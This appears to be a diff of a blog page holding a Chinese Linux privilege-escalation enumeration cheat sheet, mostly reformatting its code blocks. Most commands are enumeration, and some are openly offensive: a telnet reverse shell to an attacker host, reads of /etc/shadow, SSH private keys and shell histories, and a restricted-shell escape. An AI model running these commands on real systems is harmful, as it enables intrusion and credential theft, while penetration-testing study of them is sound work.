@@ -121,256 +121,56 @@
 <li>适应 - <strong>*自定义</strong>漏洞利用，因此适合。并非每个漏洞利用都适用于每个系统“开箱即用”。*</li>
 <li>尝试 - <em>为（大量）<strong>试验和错误</strong>做好准备。</em></li>
 </ul>
-<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h4 id="什么是分销类型？什么版本？"><a href="#什么是分销类型？什么版本？" class="headerlink" title="什么是分销类型？什么版本？"></a>什么是分销类型？什么版本？</h4><pre><code>cat /etc/issue 
-cat /etc/*-release   
-cat /etc/lsb-release      # Debian based   
-cat /etc/redhat-release   # Redhat based 
-</code></pre><h4 id="什么是内核版本？是64位吗？"><a href="#什么是内核版本？是64位吗？" class="headerlink" title="什么是内核版本？是64位吗？"></a>什么是内核版本？是64位吗？</h4><pre><code>cat /proc/version 
-uname -a 
-uname -mrs 
-rpm -q kernel 
-dmesg | grep Linux 
-ls /boot | grep vmlinuz- 
-</code></pre><h4 id="从环境变量中可以学到什么？"><a href="#从环境变量中可以学到什么？" class="headerlink" title="从环境变量中可以学到什么？"></a>从环境变量中可以学到什么？</h4><pre><code>cat /etc/profile 
-cat /etc/bashrc 
-cat ~/.bash_profile 
-cat ~/.bashrc 
-cat ~/.bash_logout 
-env 
-set
-</code></pre><h4 id="有打印机吗？"><a href="#有打印机吗？" class="headerlink" title="有打印机吗？"></a>有打印机吗？</h4><pre><code>lpstat -a
-</code></pre><h2 id="应用与服务"><a href="#应用与服务" class="headerlink" title="应用与服务"></a>应用与服务</h2><h4 id="正在运行什么服务？哪个服务具有哪个用户权限？"><a href="#正在运行什么服务？哪个服务具有哪个用户权限？" class="headerlink" title="正在运行什么服务？哪个服务具有哪个用户权限？"></a>正在运行什么服务？哪个服务具有哪个用户权限？</h4><pre><code>ps aux 
-ps -ef 
-top 
-cat /etc/services
-</code></pre><h4 id="root运行了哪些服务？在这些易受攻击的服务中，值得仔细检查！"><a href="#root运行了哪些服务？在这些易受攻击的服务中，值得仔细检查！" class="headerlink" title="root运行了哪些服务？在这些易受攻击的服务中，值得仔细检查！"></a>root运行了哪些服务？在这些易受攻击的服务中，值得仔细检查！</h4><pre><code>ps aux | grep root 
-ps -ef | grep root
-</code></pre><h4 id="安装了哪些应用程序？它们是什么版本的？他们目前正在运行吗？"><a href="#安装了哪些应用程序？它们是什么版本的？他们目前正在运行吗？" class="headerlink" title="安装了哪些应用程序？它们是什么版本的？他们目前正在运行吗？"></a>安装了哪些应用程序？它们是什么版本的？他们目前正在运行吗？</h4><pre><code>ls -alh /usr/bin/ 
-ls -alh /sbin/ 
-dpkg -l 
-rpm -qa 
-ls -alh /var/cache/apt/archivesO 
-ls -alh /var/cache/yum/
-</code></pre><h4 id="任何服务设置配置错误？是否附加了任何（易受攻击的）插件？"><a href="#任何服务设置配置错误？是否附加了任何（易受攻击的）插件？" class="headerlink" title="任何服务设置配置错误？是否附加了任何（易受攻击的）插件？"></a>任何服务设置配置错误？是否附加了任何（易受攻击的）插件？</h4><pre><code>cat /etc/syslog.conf 
-cat /etc/chttp.conf 
-cat /etc/lighttpd.conf 
-cat /etc/cups/cupsd.conf 
-cat /etc/inetd.conf 
-cat /etc/apache2/apache2.conf 
-cat /etc/my.conf 
-cat /etc/httpd/conf/httpd.conf 
-cat /opt/lampp/etc/httpd.conf 
-ls -aRl /etc/ | awk &#39;$1 ~ /^.*r.*/ 
-</code></pre><h4 id="安排了哪些工作？"><a href="#安排了哪些工作？" class="headerlink" title="安排了哪些工作？"></a>安排了哪些工作？</h4><pre><code>crontab -l 
-ls -alh /var/spool/cron 
-ls -al /etc/ | grep cron 
-ls -al /etc/cron* 
-cat /etc/cron* 
-cat /etc/at.allow 
-cat /etc/at.deny 
-cat /etc/cron.allow 
-cat /etc/cron.deny 
-cat /etc/crontab 
-cat /etc/anacrontab 
-cat /var/spool/cron/crontabs/root
-</code></pre><h4 id="任何纯文本用户名和-或密码？"><a href="#任何纯文本用户名和-或密码？" class="headerlink" title="任何纯文本用户名和/或密码？"></a>任何纯文本用户名和/或密码？</h4><pre><code>grep -i user [filename] 
-grep -i pass [filename] 
-grep -C 5 &quot;password&quot; [filename] 
-find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;   # Joomla
-</code></pre><h2 id="通信与网络"><a href="#通信与网络" class="headerlink" title="通信与网络"></a>通信与网络</h2><h4 id="系统有哪些NIC？它是否连接到另一个网络？"><a href="#系统有哪些NIC？它是否连接到另一个网络？" class="headerlink" title="系统有哪些NIC？它是否连接到另一个网络？"></a>系统有哪些NIC？它是否连接到另一个网络？</h4><pre><code>/sbin/ifconfig -a 
-cat /etc/network/interfaces 
-cat /etc/sysconfig/network
-</code></pre><h4 id="什么是网络配置设置？你能从这个网络中找到什么？DHCP服务器？DNS服务器？网关？"><a href="#什么是网络配置设置？你能从这个网络中找到什么？DHCP服务器？DNS服务器？网关？" class="headerlink" title="什么是网络配置设置？你能从这个网络中找到什么？DHCP服务器？DNS服务器？网关？"></a>什么是网络配置设置？你能从这个网络中找到什么？DHCP服务器？DNS服务器？网关？</h4><pre><code>cat /etc/resolv.conf 
-cat /etc/sysconfig/network 
-cat /etc/networks 
-iptables -L 
-hostname 
-dnsdomainname
-</code></pre><h4 id="其他用户和主机与系统进行通信的是什么？"><a href="#其他用户和主机与系统进行通信的是什么？" class="headerlink" title="其他用户和主机与系统进行通信的是什么？"></a>其他用户和主机与系统进行通信的是什么？</h4><pre><code>lsof -i 
-lsof -i :80 
-grep 80 /etc/services 
-netstat -antup 
-netstat -antpx 
-netstat -tulpn 
-chkconfig --list 
-chkconfig --list | grep 3:on 
-last 
-w
-</code></pre><h4 id="什么缓存？IP和-或MAC地址"><a href="#什么缓存？IP和-或MAC地址" class="headerlink" title="什么缓存？IP和/或MAC地址"></a>什么缓存？IP和/或MAC地址</h4><pre><code>arp -e 
-route 
-/sbin/route -nee
-</code></pre><h4 id="数据包嗅探可能吗？可以看到什么"><a href="#数据包嗅探可能吗？可以看到什么" class="headerlink" title="数据包嗅探可能吗？可以看到什么"></a>数据包嗅探可能吗？可以看到什么</h4><pre><code>tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
-</code></pre><p>注意：tcpdump tcp dst [ip] [port]和tcp dst [ip] [port]</p>
-<h4 id="你有壳吗？你能和系统互动吗？"><a href="#你有壳吗？你能和系统互动吗？" class="headerlink" title="你有壳吗？你能和系统互动吗？"></a>你有壳吗？你能和系统互动吗？</h4><pre><code>nc -lvp 4444    # Attacker. Input (Commands) 
-nc -lvp 4445    # Attacker. Ouput (Results) 
-telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP! `
-</code></pre><p>注意：http：//lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</p>
+<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h4 id="什么是分销类型？什么版本？"><a href="#什么是分销类型？什么版本？" class="headerlink" title="什么是分销类型？什么版本？"></a>什么是分销类型？什么版本？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue </span><br><span class="line">cat /etc/*-release   </span><br><span class="line">cat /etc/lsb-release      # Debian based   </span><br><span class="line">cat /etc/redhat-release   # Redhat based</span><br></pre></td></tr></table></figure>
+<h4 id="什么是内核版本？是64位吗？"><a href="#什么是内核版本？是64位吗？" class="headerlink" title="什么是内核版本？是64位吗？"></a>什么是内核版本？是64位吗？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version </span><br><span class="line">uname -a </span><br><span class="line">uname -mrs </span><br><span class="line">rpm -q kernel </span><br><span class="line">dmesg | grep Linux </span><br><span class="line">ls /boot | grep vmlinuz-</span><br></pre></td></tr></table></figure>
+<h4 id="从环境变量中可以学到什么？"><a href="#从环境变量中可以学到什么？" class="headerlink" title="从环境变量中可以学到什么？"></a>从环境变量中可以学到什么？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/profile </span><br><span class="line">cat /etc/bashrc </span><br><span class="line">cat ~/.bash_profile </span><br><span class="line">cat ~/.bashrc </span><br><span class="line">cat ~/.bash_logout </span><br><span class="line">env </span><br><span class="line">set</span><br></pre></td></tr></table></figure>
+<h4 id="有打印机吗？"><a href="#有打印机吗？" class="headerlink" title="有打印机吗？"></a>有打印机吗？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lpstat -a</span><br></pre></td></tr></table></figure>
+<h2 id="应用与服务"><a href="#应用与服务" class="headerlink" title="应用与服务"></a>应用与服务</h2><h4 id="正在运行什么服务？哪个服务具有哪个用户权限？"><a href="#正在运行什么服务？哪个服务具有哪个用户权限？" class="headerlink" title="正在运行什么服务？哪个服务具有哪个用户权限？"></a>正在运行什么服务？哪个服务具有哪个用户权限？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps aux </span><br><span class="line">ps -ef </span><br><span class="line">top </span><br><span class="line">cat /etc/services</span><br></pre></td></tr></table></figure>
+<h4 id="root运行了哪些服务？在这些易受攻击的服务中，值得仔细检查！"><a href="#root运行了哪些服务？在这些易受攻击的服务中，值得仔细检查！" class="headerlink" title="root运行了哪些服务？在这些易受攻击的服务中，值得仔细检查！"></a>root运行了哪些服务？在这些易受攻击的服务中，值得仔细检查！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep root </span><br><span class="line">ps -ef | grep root</span><br></pre></td></tr></table></figure>
+<h4 id="安装了哪些应用程序？它们是什么版本的？他们目前正在运行吗？"><a href="#安装了哪些应用程序？它们是什么版本的？他们目前正在运行吗？" class="headerlink" title="安装了哪些应用程序？它们是什么版本的？他们目前正在运行吗？"></a>安装了哪些应用程序？它们是什么版本的？他们目前正在运行吗？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /usr/bin/ </span><br><span class="line">ls -alh /sbin/ </span><br><span class="line">dpkg -l </span><br><span class="line">rpm -qa </span><br><span class="line">ls -alh /var/cache/apt/archivesO </span><br><span class="line">ls -alh /var/cache/yum/</span><br></pre></td></tr></table></figure>
+<h4 id="任何服务设置配置错误？是否附加了任何（易受攻击的）插件？"><a href="#任何服务设置配置错误？是否附加了任何（易受攻击的）插件？" class="headerlink" title="任何服务设置配置错误？是否附加了任何（易受攻击的）插件？"></a>任何服务设置配置错误？是否附加了任何（易受攻击的）插件？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/syslog.conf </span><br><span class="line">cat /etc/chttp.conf </span><br><span class="line">cat /etc/lighttpd.conf </span><br><span class="line">cat /etc/cups/cupsd.conf </span><br><span class="line">cat /etc/inetd.conf </span><br><span class="line">cat /etc/apache2/apache2.conf </span><br><span class="line">cat /etc/my.conf </span><br><span class="line">cat /etc/httpd/conf/httpd.conf </span><br><span class="line">cat /opt/lampp/etc/httpd.conf </span><br><span class="line">ls -aRl /etc/ | awk &apos;$1 ~ /^.*r.*/</span><br></pre></td></tr></table></figure>
+<h4 id="安排了哪些工作？"><a href="#安排了哪些工作？" class="headerlink" title="安排了哪些工作？"></a>安排了哪些工作？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l </span><br><span class="line">ls -alh /var/spool/cron </span><br><span class="line">ls -al /etc/ | grep cron </span><br><span class="line">ls -al /etc/cron* </span><br><span class="line">cat /etc/cron* </span><br><span class="line">cat /etc/at.allow </span><br><span class="line">cat /etc/at.deny </span><br><span class="line">cat /etc/cron.allow </span><br><span class="line">cat /etc/cron.deny </span><br><span class="line">cat /etc/crontab </span><br><span class="line">cat /etc/anacrontab </span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+<h4 id="任何纯文本用户名和-或密码？"><a href="#任何纯文本用户名和-或密码？" class="headerlink" title="任何纯文本用户名和/或密码？"></a>任何纯文本用户名和/或密码？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -i user [filename] </span><br><span class="line">grep -i pass [filename] </span><br><span class="line">grep -C 5 &quot;password&quot; [filename] </span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;   # Joomla</span><br></pre></td></tr></table></figure>
+<h2 id="通信与网络"><a href="#通信与网络" class="headerlink" title="通信与网络"></a>通信与网络</h2><h4 id="系统有哪些NIC？它是否连接到另一个网络？"><a href="#系统有哪些NIC？它是否连接到另一个网络？" class="headerlink" title="系统有哪些NIC？它是否连接到另一个网络？"></a>系统有哪些NIC？它是否连接到另一个网络？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/sbin/ifconfig -a </span><br><span class="line">cat /etc/network/interfaces </span><br><span class="line">cat /etc/sysconfig/network</span><br></pre></td></tr></table></figure>
+<h4 id="什么是网络配置设置？你能从这个网络中找到什么？DHCP服务器？DNS服务器？网关？"><a href="#什么是网络配置设置？你能从这个网络中找到什么？DHCP服务器？DNS服务器？网关？" class="headerlink" title="什么是网络配置设置？你能从这个网络中找到什么？DHCP服务器？DNS服务器？网关？"></a>什么是网络配置设置？你能从这个网络中找到什么？DHCP服务器？DNS服务器？网关？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf </span><br><span class="line">cat /etc/sysconfig/network </span><br><span class="line">cat /etc/networks </span><br><span class="line">iptables -L </span><br><span class="line">hostname </span><br><span class="line">dnsdomainname</span><br></pre></td></tr></table></figure>
+<h4 id="其他用户和主机与系统进行通信的是什么？"><a href="#其他用户和主机与系统进行通信的是什么？" class="headerlink" title="其他用户和主机与系统进行通信的是什么？"></a>其他用户和主机与系统进行通信的是什么？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lsof -i </span><br><span class="line">lsof -i :80 </span><br><span class="line">grep 80 /etc/services </span><br><span class="line">netstat -antup </span><br><span class="line">netstat -antpx </span><br><span class="line">netstat -tulpn </span><br><span class="line">chkconfig --list </span><br><span class="line">chkconfig --list | grep 3:on </span><br><span class="line">last </span><br><span class="line">w</span><br></pre></td></tr></table></figure>
+<h4 id="什么缓存？IP和-或MAC地址"><a href="#什么缓存？IP和-或MAC地址" class="headerlink" title="什么缓存？IP和/或MAC地址"></a>什么缓存？IP和/或MAC地址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp -e </span><br><span class="line">route </span><br><span class="line">/sbin/route -nee</span><br></pre></td></tr></table></figure>
+<h4 id="数据包嗅探可能吗？可以看到什么"><a href="#数据包嗅探可能吗？可以看到什么" class="headerlink" title="数据包嗅探可能吗？可以看到什么"></a>数据包嗅探可能吗？可以看到什么</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21</span><br></pre></td></tr></table></figure>
+<p>注意：tcpdump tcp dst [ip] [port]和tcp dst [ip] [port]</p>
+<h4 id="你有壳吗？你能和系统互动吗？"><a href="#你有壳吗？你能和系统互动吗？" class="headerlink" title="你有壳吗？你能和系统互动吗？"></a>你有壳吗？你能和系统互动吗？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444    # Attacker. Input (Commands) </span><br><span class="line">nc -lvp 4445    # Attacker. Ouput (Results) </span><br><span class="line">telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP! `</span><br></pre></td></tr></table></figure>
+<p>注意：http：//lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</p>
 <h4 id="端口转发可能吗？重定向并与来自其他视图的流量进行交互"><a href="#端口转发可能吗？重定向并与来自其他视图的流量进行交互" class="headerlink" title="端口转发可能吗？重定向并与来自其他视图的流量进行交互"></a>端口转发可能吗？<em>重定向并与来自其他视图的流量进行交互</em></h4><p>注意：http：//<a href="http://www.boutell.com/rinetd/" target="_blank" rel="noopener">www.boutell.com/rinetd/</a></p>
 <p>注意：http：//<a href="http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch" target="_blank" rel="noopener">www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch</a></p>
 <p>注意：http：//downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip</p>
 <p>注意：FPipe.exe -l [本地端口] -r [远程端口] -s [本地端口] [本地IP]</p>
-<pre><code>FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
-
-</code></pre><p>注意：ssh - [L / R] [本地端口]：[远程ip]：[远程端口] [本地用户] @ [本地ip]</p>
-<pre><code>ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port 
-ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port 
-
-</code></pre><p>注意：mknod backpipe p; nc -l -p [远程端口] <backpipe |="" nc="" [本地ip]="" [本地端口]="">反向管道</backpipe></p>
-<pre><code>mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.5.5.151 80 &gt;backpipe    # Port Relay mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe    # Proxy (Port 80 to 8080) 
-mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe    # Proxy monitor (Port 80 to 8080) 
-
-</code></pre><h4 id="隧道可能吗？远程本地发送命令"><a href="#隧道可能吗？远程本地发送命令" class="headerlink" title="隧道可能吗？远程本地发送命令"></a>隧道可能吗？远程本地发送命令</h4><pre><code>ssh -D 127.0.0.1:9050 -N [username]@[ip] 
-proxychains ifconfig 
-
-</code></pre><h2 id="机密信息和用户"><a href="#机密信息和用户" class="headerlink" title="机密信息和用户"></a>机密信息和用户</h2><h4 id="你是谁？谁登录？谁已登录？那里还有谁？谁能做什么？"><a href="#你是谁？谁登录？谁已登录？那里还有谁？谁能做什么？" class="headerlink" title="你是谁？谁登录？谁已登录？那里还有谁？谁能做什么？"></a>你是谁？谁登录？谁已登录？那里还有谁？谁能做什么？</h4><pre><code>id 
-who 
-w 
-last 
-cat /etc/passwd | cut -d: -f1    # List of users 
-grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 { print $1}&#39;   # List of super users 
-awk -F: &#39;($3 == &quot;0&quot;) {print}&#39; 
-/etc/passwd   # List of super users cat /etc/sudoers 
-sudo -l
-
-</code></pre><h4 id="可以找到哪些敏感文件？"><a href="#可以找到哪些敏感文件？" class="headerlink" title="可以找到哪些敏感文件？"></a>可以找到哪些敏感文件？</h4><pre><code>cat /etc/passwd 
-cat /etc/group 
-cat /etc/shadow 
-ls -alh /var/mail/
-
-</code></pre><h4 id="家庭导演中有什么“有趣”的东西？如果可以访问"><a href="#家庭导演中有什么“有趣”的东西？如果可以访问" class="headerlink" title="家庭导演中有什么“有趣”的东西？如果可以访问"></a>家庭导演中有什么“有趣”的东西？如果可以访问</h4><pre><code>ls -ahlR /root/ 
-ls -ahlR /home/
-
-</code></pre><h4 id="是否有密码-脚本，数据库，配置文件或日志文件？密码的默认路径和位置"><a href="#是否有密码-脚本，数据库，配置文件或日志文件？密码的默认路径和位置" class="headerlink" title="是否有密码; 脚本，数据库，配置文件或日志文件？密码的默认路径和位置"></a>是否有密码; 脚本，数据库，配置文件或日志文件？密码的默认路径和位置</h4><pre><code>cat /var/apache2/config.inc 
-cat /var/lib/mysql/mysql/user.MYD 
-cat /root/anaconda-ks.cfg
-
-</code></pre><h4 id="用户正在做什么？是否有明文密码？他们在编辑什么？"><a href="#用户正在做什么？是否有明文密码？他们在编辑什么？" class="headerlink" title="用户正在做什么？是否有明文密码？他们在编辑什么？"></a>用户正在做什么？是否有明文密码？他们在编辑什么？</h4><pre><code>cat ~/.bash_history 
-cat ~/.nano_history 
-cat ~/.atftp_history 
-cat ~/.mysql_history 
-cat ~/.php_history
-
-</code></pre><h4 id="可以找到哪些用户信息？"><a href="#可以找到哪些用户信息？" class="headerlink" title="可以找到哪些用户信息？"></a>可以找到哪些用户信息？</h4><pre><code>cat ~/.bashrc 
-cat ~/.profile 
-cat /var/mail/root 
-cat /var/spool/mail/root
-
-</code></pre><h4 id="可以找到私钥信息吗？"><a href="#可以找到私钥信息吗？" class="headerlink" title="可以找到私钥信息吗？"></a>可以找到私钥信息吗？</h4><pre><code>cat ~/.ssh/authorized_keys 
-cat ~/.ssh/identity.pub 
-cat ~/.ssh/identity 
-cat ~/.ssh/id_rsa.pub 
-cat ~/.ssh/id_rsa 
-cat ~/.ssh/id_dsa.pub 
-cat ~/.ssh/id_dsa 
-cat /etc/ssh/ssh_config 
-cat /etc/ssh/sshd_config 
-cat /etc/ssh/ssh_host_dsa_key.pub 
-cat /etc/ssh/ssh_host_dsa_key 
-cat /etc/ssh/ssh_host_rsa_key.pub 
-cat /etc/ssh/ssh_host_rsa_key 
-cat /etc/ssh/ssh_host_key.pub 
-cat /etc/ssh/ssh_host_key `
-
-</code></pre><h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><h4 id="哪些配置文件可以写在-etc-中？能够重新配置服务吗？"><a href="#哪些配置文件可以写在-etc-中？能够重新配置服务吗？" class="headerlink" title="哪些配置文件可以写在/ etc /中？能够重新配置服务吗？"></a>哪些配置文件可以写在/ etc /中？<em>能够重新配置服务吗？</em></h4><pre><code>ls -aRl /etc/ | awk &#39;$1 ~ /^.*w.*/&#39; 2&gt;/dev/null     # Anyone 
-ls -aRl /etc/ | awk &#39;$1 ~ /^..w/&#39; 2&gt;/dev/null       # Owner 
-ls -aRl /etc/ | awk &#39;$1 ~ /^.....w/&#39; 2&gt;/dev/null    # Group 
-ls -aRl /etc/ | awk &#39;$1 ~ /w.$/&#39; 2&gt;/dev/null        # Other  
-find /etc/ -readable -type f 2&gt;/dev/null               # Anyone 
-find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null   # Anyone `
-
-</code></pre><h4 id="在-var-中可以找到什么？"><a href="#在-var-中可以找到什么？" class="headerlink" title="在/ var /中可以找到什么？"></a>在/ var /中可以找到什么？</h4><pre><code>ls -alh /var/log 
-ls -alh /var/mail 
-ls -alh /var/spool 
-ls -alh /var/spool/lpd 
-ls -alh /var/lib/pgsql 
-ls -alh /var/lib/mysql 
-cat /var/lib/dhcp3/dhclient.leases
-
-</code></pre><h4 id="网站上的任何设置-文件（隐藏）？有数据库信息的任何设置文件？"><a href="#网站上的任何设置-文件（隐藏）？有数据库信息的任何设置文件？" class="headerlink" title="网站上的任何设置/文件（隐藏）？有数据库信息的任何设置文件？"></a>网站上的任何设置/文件（隐藏）？<em>有数据库信息的任何设置文件？</em></h4><pre><code>ls -alhR /var/www/ 
-ls -alhR /srv/www/htdocs/ 
-ls -alhR /usr/local/www/apache22/data/ 
-ls -alhR /opt/lampp/htdocs/ 
-ls -alhR /var/www/html/
-
-</code></pre><p>日志文件中是否有任何内容（可以帮助“本地文件包含”！）</p>
-<pre><code>cat /etc/httpd/logs/access_log 
-cat /etc/httpd/logs/access.log 
-cat /etc/httpd/logs/error_log 
-cat /etc/httpd/logs/error.log 
-cat /var/log/apache2/access_log 
-cat /var/log/apache2/access.log 
-cat /var/log/apache2/error_log 
-cat /var/log/apache2/error.log 
-cat /var/log/apache/access_log 
-cat /var/log/apache/access.log 
-cat /var/log/auth.log 
-cat /var/log/chttp.log 
-cat /var/log/cups/error_log 
-cat /var/log/dpkg.log 
-cat /var/log/faillog 
-cat /var/log/httpd/access_log 
-cat /var/log/httpd/access.log 
-cat /var/log/httpd/error_log 
-cat /var/log/httpd/error.log 
-cat /var/log/lastlog 
-cat /var/log/lighttpd/access.log 
-cat /var/log/lighttpd/error.log 
-cat /var/log/lighttpd/lighttpd.access.log 
-cat /var/log/lighttpd/lighttpd.error.log 
-cat /var/log/messages 
-cat /var/log/secure 
-cat /var/log/syslog 
-cat /var/log/wtmp 
-cat /var/log/xferlog 
-cat /var/log/yum.log 
-cat /var/run/utmp 
-cat /var/webmin/miniserv.log 
-cat /var/www/logs/access_log 
-cat /var/www/logs/access.log 
-ls -alh /var/lib/dhcp3/ 
-ls -alh /var/log/postgresql/ 
-ls -alh /var/log/proftpd/ 
-ls -alh /var/log/samba/  
-Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp `
-
-</code></pre><p>注：http：//<a href="http://www.thegeekstuff.com/2011/08/linux-var-log-files/" target="_blank" rel="noopener">www.thegeekstuff.com/2011/08/linux-var-log-files/</a></p>
-<h4 id="如果命令有限，你会打破“监狱”外壳？"><a href="#如果命令有限，你会打破“监狱”外壳？" class="headerlink" title="如果命令有限，你会打破“监狱”外壳？"></a>如果命令有限，你会打破“监狱”外壳？</h4><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; echo os.system(&#39;/bin/bash&#39;) /bin/sh -i
-
-</code></pre><h4 id="如何安装文件系统？"><a href="#如何安装文件系统？" class="headerlink" title="如何安装文件系统？"></a>如何安装文件系统？</h4><pre><code>mount df -h
-
-</code></pre><h4 id="是否有任何未安装的文件系统？"><a href="#是否有任何未安装的文件系统？" class="headerlink" title="是否有任何未安装的文件系统？"></a>是否有任何未安装的文件系统？</h4><pre><code>cat /etc/fstab
-
-</code></pre><h4 id="使用了什么“高级Linux文件权限”？"><a href="#使用了什么“高级Linux文件权限”？" class="headerlink" title="使用了什么“高级Linux文件权限”？"></a>使用了什么“高级Linux文件权限”？</h4><pre><code>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
-find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
-find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
-
-find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID
-for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
-
-# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
-find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null
-
-</code></pre><h4 id="哪里可以写入和执行？一些常见的地方：-tmp，-var-tmp，-dev-shm"><a href="#哪里可以写入和执行？一些常见的地方：-tmp，-var-tmp，-dev-shm" class="headerlink" title="哪里可以写入和执行？一些常见的地方：/ tmp，/ var / tmp，/ dev / shm"></a>哪里可以写入和执行？一些常见的地方：/ tmp，/ var / tmp，/ dev / shm</h4><pre><code>find / -writable -type d 2&gt;/dev/null      # world-writeable folders 
-find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders 
-find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders  
-find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders  
-find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders
-
